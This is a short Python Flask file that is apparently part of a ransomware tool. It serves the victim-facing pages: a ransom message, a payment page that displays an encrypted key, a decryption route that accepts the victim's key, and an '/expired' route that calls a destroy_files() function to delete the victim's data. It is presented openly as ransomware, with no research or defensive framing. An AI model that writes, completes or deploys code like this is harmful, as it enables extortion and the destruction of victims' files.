from flask import Flask, render_template, request, redirect
from maindecrypt import decrypt, destroy_files   # Import decrypt logic
def create_app(encrypted_key_b64):
    app = Flask(__name__)

    @app.route('/')
    def home():
        return render_template('index.html')  # Directly load ransomware message

    @app.route('/payment')
    def payment():
        return render_template('payment.html', key=encrypted_key_b64)
    
    @app.route('/expired')
    def expired():
        destroy_files()
        return render_template('expired.html')

    @app.route('/success', methods=['POST'])
    def success():
        entered_key = request.form.get('key')
        try:
            decrypt(entered_key.strip())  # Attempt decryption
            return render_template('success.html')
        except Exception as e:
            return render_template('error.html', message="❌ Decryption failed. Invalid key or file corruption.")

    return app
